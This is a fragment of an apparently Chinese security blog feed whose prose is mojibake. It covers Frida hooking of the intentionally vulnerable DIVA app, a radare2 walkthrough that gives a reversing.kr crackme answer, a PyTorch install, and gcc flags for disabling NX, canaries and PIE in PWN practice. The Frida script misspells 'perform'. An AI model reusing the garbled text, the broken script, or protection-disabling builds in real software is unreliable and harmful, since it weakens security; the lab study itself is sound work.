loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;code>frida-trace -U -i open com.android.browser&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190616150506.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>éšä¾¿ç‚¹ä¸€ä¸‹æµè§ˆå™¨&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190616150623.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>æµ‹è¯•Diva&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190616151039.jpg"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190616151307.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;code>frida-trace -U -i &amp;quot;open*&amp;quot; jakhar.aseem.diva&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190616151432.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>è¿›è¡ŒHook login.class checkoutå‡½æ•°&lt;/p>
&lt;p>é€†å‘è¿‡ç¨‹ç•¥&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190616151826.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>HOOKè„šæœ¬ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Java&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">perfrom&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;######&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">var&lt;/span> &lt;span class="nx">logActivity&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">Java&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">use&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;jakhar.aseem.diva.LogActivity&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">logActivity&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">checkout&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">implementation&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kd">function&lt;/span>&lt;span class="p">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Hook&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">})&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å‘½ä»¤è¡Œè½½å…¥è„šæœ¬è¿è¡Œ&lt;/p>
&lt;p>&lt;code>frida -U jakhar.aseem.diva -l diva1.js --no-pause&lt;/code>&lt;/p>
&lt;p>è¿›å…¥loggingå…³å¡ ç‚¹å‡»check outï¼ŒæˆåŠŸhookåˆ°checkoutå‡½æ•°ã€‚&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190616153553.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="0x04-æ€»ç»“">0x04 æ€»ç»“&lt;/h3>
&lt;hr>
&lt;p>ç®—æ˜¯ç®€å•çš„å…¥é—¨äº†fridaã€‚&lt;/p>
&lt;p>fridaè¿˜æœ‰å¾ˆå¤šå‰å®³çš„åŠŸèƒ½ã€‚å¤šè¯»è¯»å®˜æ–¹æ–‡æ¡£ï¼Œæ”¶è´§ä¼šæ›´å¤šã€‚&lt;/p></description></item><item><title>radare2+cutterä½¿ç”¨æŒ‡å—</title><link>https://ykiko.top/p/radare2-cutter%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</link><pubDate>Wed, 02 Jan 2019 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/radare2-cutter%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</guid><description>&lt;h1 id="radare2cutterä½¿ç”¨æŒ‡å—">radare2+cutterä½¿ç”¨æŒ‡å—&lt;/h1>
&lt;h3 id="0x00-ä»‹ç»">0x00 ä»‹ç»&lt;/h3>
&lt;p>&lt;a class="link" href="https://github.com/radare/radare2" target="_blank" rel="noopener"
>radare2&lt;/a> ä¸€ä¸ªå¾ˆå®ç”¨çš„äºŒè¿›åˆ¶åˆ†æå’Œè°ƒè¯•å·¥å…·&lt;/p>
&lt;p>&lt;a class="link" href="https://github.com/radareorg/cutter" target="_blank" rel="noopener"
>cutter&lt;/a> æ˜¯r2çš„GUIç‰ˆã€‚&lt;/p>
&lt;h3 id="0x01-å®‰è£…">0x01 å®‰è£…&lt;/h3>
&lt;p>æ”¯æŒçš„å¹³å°æœ‰å¦‚ä¸‹ï¼š&lt;/p>
&lt;blockquote>
&lt;p>Windows (since XP), GNU/Linux, OS X, [Net|Free|Open]BSD, Android, iOS, OSX, QNX, Solaris, Haiku, FirefoxOS.&lt;/p>
&lt;/blockquote>
&lt;p>Linuxå¹³å°ä¸‹ç›´æ¥&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">git clone https://github.com/radare/radare2cd radare2sys/install.sh //&lt;span class="o">(&lt;/span>or sys/user.sh&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Windowsä¸‹å¯ä»¥ä¸‹è½½äºŒè¿›åˆ¶å®‰è£…åŒ…å®‰è£…ã€‚å®˜ç½‘&lt;a class="link" href="https://www.radare.org/r/" target="_blank" rel="noopener"
>ä¸‹è½½&lt;/a>&lt;/p>
&lt;p>Windowsç”¨æˆ·æ¨èä½¿ç”¨Windowsä¸‹çš„linuxï¼ˆwslï¼‰æ¥ä½¿ç”¨ï¼Œ winä¸‹æ›´æ–°æ…¢ã€‚è¿˜æ˜¯linuxä¸‹ç”¨å¾—èˆ’æœï¼ˆæ–¹ä¾¿ï¼Œå¿«æ·ï¼‰ã€‚&lt;/p>
&lt;h3 id="0x03-å·¥å…·ä»‹ç»">0x03 å·¥å…·ä»‹ç»&lt;/h3>
&lt;p>r2å¸¸ç”¨çš„åŒ…å«æœ‰ä¸€ä¸‹ç»„ä»¶ï¼š&lt;/p>
&lt;ul>
&lt;li>
&lt;p>rax2 ç”¨äºæ•°å€¼è½¬æ¢&lt;/p>
&lt;/li>
&lt;li>
&lt;p>rasm2 åæ±‡ç¼–å’Œæ±‡ç¼–&lt;/p>
&lt;/li>
&lt;li>
&lt;p>rabin2 æŸ¥çœ‹æ–‡ä»¶æ ¼å¼&lt;/p>
&lt;/li>
&lt;li>
&lt;p>radiff2 å¯¹æ–‡ä»¶è¿›è¡Œ diff&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ragg2/ragg2Â­cc å¼€å‘shellcodeå·¥å…·&lt;/p>
&lt;/li>
&lt;li>
&lt;p>rahash2 å„ç§å¯†ç ç®—æ³•ï¼Œ hashç®—æ³•&lt;/p>
&lt;/li>
&lt;li>
&lt;p>radare2 æ•´åˆäº†æ‰€æœ‰å·¥å…·&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>ä½¿ç”¨å¸®åŠ©ç›´æ¥&lt;code>-h&lt;/code>&lt;/p>
&lt;ul>
&lt;li>rax2&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20181123153746.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ul>
&lt;li>rasm2&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20181123153901.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/1542959275318.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ul>
&lt;li>rabin2&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20181123154355.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>eg: (&lt;code>-I&lt;/code>)&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20181123154422.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ul>
&lt;li>radiff2&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20181123154448.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ul>
&lt;li>ragg2/ragg2Â­cc&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20181123154514.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ul>
&lt;li>rahash2&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20181123154604.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;ul>
&lt;li>radare2 (æœ€å¸¸ç”¨) å¯ç¼©å†™ä¸ºr2&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20181123155156.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="0x04-r2-å®æˆ˜å­¦ä¹ ">0x04 r2 å®æˆ˜å­¦ä¹ &lt;/h3>
&lt;p>challengeæ¥æºäºï¼šhttp://reversing.kr&lt;/p>
&lt;p>å…ˆæŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶ä¿¡æ¯ï¼š&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20181123155334.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>GUI?:&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20181123155444.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>ç”¨r2è½½å…¥ï¼Œè‡ªåŠ¨åˆ†æ&lt;code>aaa&lt;/code>å‘½ä»¤ï¼š&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20181123155649.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;code>vv&lt;/code> å‘½ä»¤æŸ¥çœ‹ç•Œé¢ï¼š&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20181123160028.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>æ³¨æ„0x00401080 è°ƒç”¨äº†GetDlgItemTextA&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20181123160457.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>s è°ƒåˆ°mainå‡½æ•°ï¼ŒæŸ¥çœ‹mainçš„æ±‡ç¼–ä»£ç ï¼š&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20181123160744.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20181123160818.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;code>pdc&lt;/code>æŸ¥çœ‹ä¼ªä»£ç ï¼š&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20181123161145.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>å¤§å†™çš„&lt;code>VV&lt;/code>å‘½ä»¤æŸ¥çœ‹å›¾å½¢ç•Œé¢ ä½¿ç”¨hijkæ¥è¿›è¡Œç•Œé¢ç§»åŠ¨ã€‚&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20181123161242.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>çœ‹åˆ°è°ƒç”¨åœ°å€0x401020ï¼Œsè·³è¿‡å» ï¼›å‘ç°æ²¡è§£æ å¯ä½¿ç”¨afæ¥è§£æã€‚&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20181123162026.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>çœ‹åˆ°GetDlgTemTextAè°ƒç”¨ï¼š&lt;/p>
&lt;p>å‡½æ•°è°ƒç”¨&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20181123162157.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20181123162302.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>å·®ä¸å¤šé€»è¾‘å°±æ˜¯ä¸€ç›´æ¯”å¯¹å­—ç¬¦ä¸²ï¼Œä»ç¬¬äºŒä½å¼€å§‹æ¯”æœ€åç¬¬ä¸€ä½&lt;/p>
&lt;p>å¾—åˆ°&lt;code>Ea5yR3versing&lt;/code>&lt;/p>
&lt;p>å‘½ä»¤è®°ä¸ä½æˆ–è€…æƒ³çŸ¥é“æœ‰äº›ä»€ä¹ˆå‘½ä»¤å¯ä»¥ç”¨å°±å¯ä»¥åŠ ä¸ªï¼Ÿå·æŸ¥è¯¢&lt;/p>
&lt;h3 id="0x05-cutterçš„ä½¿ç”¨">0x05 Cutterçš„ä½¿ç”¨&lt;/h3>
&lt;ul>
&lt;li>å¤šå›¾å¾…è¡¥&lt;/li>
&lt;/ul>
&lt;p>&lt;a class="link" href="https://legacy.gitbook.com/book/radare/radare2book/details" target="_blank" rel="noopener"
>Radare2 Book&lt;/a>&lt;/p></description></item><item><title>pytorchå­¦ä¹ _1å®‰è£…</title><link>https://ykiko.top/p/pytorch%E5%AD%A6%E4%B9%A0_1%E5%AE%89%E8%A3%85/</link><pubDate>Sat, 08 Dec 2018 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/pytorch%E5%AD%A6%E4%B9%A0_1%E5%AE%89%E8%A3%85/</guid><description>&lt;h1 id="pytorchå­¦ä¹ _1å®‰è£…">pytorchå­¦ä¹ _1å®‰è£…&lt;/h1>
&lt;h3 id="å‰è¨€">å‰è¨€&lt;/h3>
&lt;p>æœ¬æ¥æƒ³ç€ç”¨&lt;strong>tensorflow&lt;/strong>çš„ ç„¶è€ŒGPUç‰ˆæ€»æ˜¯æŠ¥å„ç§å„æ ·çš„BUG&lt;/p>
&lt;p>æ‰€ä»¥æ‰“ç®—å…¥å‘ä¸€ä¸‹å­¦pytorch&lt;/p>
&lt;p>é…ç½®ï¼šwin10+i76700HQ+GTX1060+16G&lt;/p>
&lt;p>è½¯ä»¶ç‰ˆæœ¬ï¼šCUDA10+python3.6+pytorch 1 æºç ç¼–è¯‘&lt;/p>
&lt;p>å°è¯•1ï¼šå®˜æ–¹å®‰è£…æ–¹æ³•ä¸æ”¯æŒ CUDA 10 å¤ªå‘ï¼Œç¤¾åŒºæœ‰ç¼–è¯‘é€šè¿‡çš„ï¼Œæ‰€ä»¥åªæœ‰è‡ªå·±ç¼–è¯‘è¯•è¯•&lt;/p>
&lt;p>æŠ¥å„ç§å¼‚å¸¸ï¼Œä½†æ˜¯æ²¡åœï¼Œé‚£å°±ç­‰ç­‰&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20181204002444.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20181204153247.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>CPUè¢«å æ»¡ï¼Œå·¨å¡ã€‚&lt;/p>
&lt;p>ä¸€è§‰èµ·æ¥ä¹‹åï¼šå®‰è£…å¤±è´¥&lt;/p>
&lt;p>å°è¯•2ï¼šç­‰ç€å®Œå…¨æ”¯æŒCUDA10ä¹‹ååœ¨ç”¨GPUè·‘å§ã€‚&lt;/p>
&lt;p>å¦¥åï¼šç”¨é˜¿é‡Œäº‘çš„å­¦ç”ŸæœåŠ¡å™¨è£…äº†CPUçš„ç‰ˆæœ¬ï¼šé¡ºä¾¿æŠŠTensorFlow ä¹Ÿç»™è£…äº†ã€‚ã€‚&lt;/p>
&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20181204153129.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>ç„¶è€Œ åœ¨ä¸€ä¸ªæ˜ŸæœŸä¹‹å pytorch1.0å‡ºæ¥äº† æ”¯æŒäº†CUDA10 nice&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">pip3 install http://download.pytorch.org/whl/cu100/torch-1.0.0-cp36-cp36m-win_amd64.whl
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pip3 install torchvision
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20181208233904.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>æœŸé—´æ²¡æœ‰é‡åˆ°ä»»ä½•é—®é¢˜ çœŸèˆ’ç•…ã€‚ã€‚ã€‚&lt;/p></description></item><item><title>PWN_å°toolsçš„ä½¿ç”¨</title><link>https://ykiko.top/p/pwn_%E5%B0%8Ftools%E7%9A%84%E4%BD%BF%E7%94%A8/</link><pubDate>Mon, 22 Oct 2018 00:00:00 +0800</pubDate><guid>https://ykiko.top/p/pwn_%E5%B0%8Ftools%E7%9A%84%E4%BD%BF%E7%94%A8/</guid><description>&lt;h1 id="pwn_å°toolsçš„ä½¿ç”¨">PWN_å°toolsçš„ä½¿ç”¨&lt;/h1>
&lt;h3 id="gcc-ç¼–è¯‘å¸¸ç”¨å‘½ä»¤">GCC ç¼–è¯‘å¸¸ç”¨å‘½ä»¤&lt;/h3>
&lt;table>
&lt;tr>
&lt;th>ä¸å¸¦é€‰é¡¹&lt;/th>
&lt;th>&lt;/th>
&lt;th>gcc test.c å°†test.cé¢„å¤„ç†ã€æ±‡ç¼–ã€ç¼–è¯‘å¹¶é“¾æ¥å½¢æˆå¯æ‰§è¡Œæ–‡ä»¶ã€‚è¿™é‡ŒæœªæŒ‡å®šè¾“å‡ºæ–‡ä»¶ï¼Œé»˜è®¤è¾“å‡ºä¸ºa.outã€‚&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>-o&lt;/th>
&lt;th>æŒ‡å®šç”Ÿæˆçš„è¾“å‡ºæ–‡ä»¶ï¼›&lt;/th>
&lt;th>gcc test.c -o test å°†test.cé¢„å¤„ç†ã€æ±‡ç¼–ã€ç¼–è¯‘å¹¶é“¾æ¥å½¢æˆå¯æ‰§è¡Œæ–‡ä»¶testã€‚-oé€‰é¡¹ç”¨æ¥æŒ‡å®šè¾“å‡ºæ–‡ä»¶çš„æ–‡ä»¶åã€‚&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>-E&lt;/th>
&lt;th>ä»…æ‰§è¡Œç¼–è¯‘é¢„å¤„ç†ï¼›&lt;/th>
&lt;th>gcc -E test.c -o test.i å°†test.cé¢„å¤„ç†è¾“å‡ºtest.iæ–‡ä»¶ã€‚&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>-S&lt;/th>
&lt;th>å°†Cä»£ç è½¬æ¢ä¸ºæ±‡ç¼–ä»£ç ï¼›&lt;/th>
&lt;th>gcc -S test.i å°†é¢„å¤„ç†è¾“å‡ºæ–‡ä»¶test.iæ±‡ç¼–æˆtest.sæ–‡ä»¶ã€‚&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>-c&lt;/th>
&lt;th>ä»…æ‰§è¡Œç¼–è¯‘æ“ä½œï¼Œä¸è¿›è¡Œè¿æ¥æ“ä½œã€‚&lt;/th>
&lt;th>gcc -c test.s å°†æ±‡ç¼–è¾“å‡ºæ–‡ä»¶test.sç¼–è¯‘è¾“å‡ºtest.oæ–‡ä»¶ã€‚&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>-wall&lt;/th>
&lt;th>æ˜¾ç¤ºè­¦å‘Šä¿¡æ¯ï¼›&lt;/th>
&lt;th>&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>**æ— é€‰é¡¹é“¾æ¥**&lt;/th>
&lt;th>&lt;/th>
&lt;th>gcc test.o -o test å°†ç¼–è¯‘è¾“å‡ºæ–‡ä»¶test.oé“¾æ¥æˆæœ€ç»ˆå¯æ‰§è¡Œæ–‡ä»¶testã€‚&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>-O&lt;/th>
&lt;th>ä½¿ç”¨ç¼–è¯‘ä¼˜åŒ–çº§åˆ«1ç¼–è¯‘ç¨‹åºã€‚çº§åˆ«ä¸º1~3ï¼Œçº§åˆ«è¶Šå¤§ä¼˜åŒ–æ•ˆæœè¶Šå¥½ï¼Œä½†ç¼–è¯‘æ—¶é—´è¶Šé•¿&lt;/th>
&lt;th>gcc -O1 test.c -o test&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>&lt;/th>
&lt;th>å…³æ‰DEP/NXï¼ˆå †æ ˆä¸å¯æ‰§è¡Œï¼‰&lt;/th>
&lt;th>gcc -z execstack -o level level.c&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>&lt;/th>
&lt;th>å…³æ‰Stack Protector/Canaryï¼ˆæ ˆä¿æŠ¤ï¼‰&lt;/th>
&lt;th>gcc -fno-stack-protector -o level level.c&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>&lt;/th>
&lt;th>å…³æ‰ç¨‹åºASLR/PIEï¼ˆç¨‹åºéšæœºåŒ–ä¿æŠ¤ï¼‰&lt;/th>
&lt;th>gcc -no-pie level level.c&lt;/th>
&lt;/tr>&lt;tr>
&lt;th>&lt;/th>
&lt;th>64ä½linuxä¸‹é¢çš„GCCç¼–è¯‘å‡ºä¸€ä¸ª32ä½å¯æ‰§è¡Œç¨‹åº&lt;/th>
&lt;th>gcc -m32 -z execstack -fno-stack-protector -o level level.c&lt;/th>
&lt;/tr>&lt;/table>
&lt;h3 id="gdbå¸¸ç”¨è°ƒè¯•å‘½ä»¤">GDBå¸¸ç”¨è°ƒè¯•å‘½ä»¤&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="n">gcc&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">g&lt;/span> &lt;span class="n">main&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="c1">//åœ¨ç›®æ ‡æ–‡ä»¶åŠ å…¥æºä»£ç çš„ä¿¡æ¯
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">gdb&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">out&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">start&lt;/span> &lt;span class="c1">//å¼€å§‹è°ƒè¯•
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">n&lt;/span> &lt;span class="c1">//ä¸€æ¡ä¸€æ¡æ‰§è¡Œ
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">step&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">s&lt;/span> &lt;span class="c1">//æ‰§è¡Œä¸‹ä¸€æ¡ï¼Œå¦‚æœå‡½æ•°è¿›å…¥å‡½æ•°
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">backtrace&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">bt&lt;/span> &lt;span class="c1">//æŸ¥çœ‹å‡½æ•°è°ƒç”¨æ ˆå¸§
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">info&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="n">locals&lt;/span> &lt;span class="c1">//æŸ¥çœ‹å½“å‰æ ˆå¸§å±€éƒ¨å˜é‡
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">frame&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">f&lt;/span> &lt;span class="c1">//é€‰æ‹©æ ˆå¸§ï¼Œå†æŸ¥çœ‹å±€éƒ¨å˜é‡
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">print&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">p&lt;/span> &lt;span class="c1">//æ‰“å°å˜é‡çš„å€¼
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">gdb&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">finish&lt;/span> &lt;span class="c1">//è¿è¡Œåˆ°å½“å‰å‡½æ•°è¿”å›
